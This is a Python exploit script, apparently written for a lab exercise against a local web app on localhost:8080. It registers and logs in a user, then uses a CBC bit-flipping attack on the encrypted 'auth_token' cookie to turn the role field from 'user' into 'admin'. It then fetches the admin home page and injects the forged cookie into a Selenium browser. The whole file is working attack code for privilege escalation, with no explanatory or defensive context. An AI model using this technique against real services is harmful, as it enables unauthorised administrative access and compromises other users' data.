import requests
from tools import *
from selenium import webdriver


def cookieMaker(cookie: bytes):
    newBlock = b""
    MSG_BLOCK = b"&role=user" + (b"\x00" * 5) + bytes.fromhex("06")
    BLOCK_DESIRED = b"&role=admin" + (b"\x00" * 4) + bytes.fromhex("05")
    iv = cookie[:16]
    block2 = cookie[16:32]
    for i in range(16):
        newBlock += int.to_bytes(block2[i] ^ MSG_BLOCK[i] ^ BLOCK_DESIRED[i])
    return iv + block2 + newBlock + cookie[32:]


# Set the URL for the session

# Make 10000 random accounts
URL = "http://localhost:8080/register"

# # make the attack account
session = requests.Session()
username = "x" * 5
payload = {"user": username, "password": "password123", "register": ""}
response = session.post(URL, data=payload)

LOGIN_URL = "http://localhost:8080/"
payload = {"user": username, "password": "password123", "Login": ""}
response = session.post(LOGIN_URL, data=payload)

cookie = session.cookies.get_dict()["auth_token"]
cookie = hex_to_ascii(cookie)
new_cookie = cookieMaker(cookie)
session.cookies.set("auth_token", ascii_to_hex(new_cookie))

HOME_URL = "http://localhost:8080/home"
response = session.get(HOME_URL)
with open("output.html", "w") as f:
    f.write(response.text)
driver = webdriver.Edge()
driver.get(LOGIN_URL)
driver.add_cookie({"name": "auth_token", "value": ascii_to_hex(new_cookie)})
driver.get(HOME_URL)
input("Press Enter to continue...")
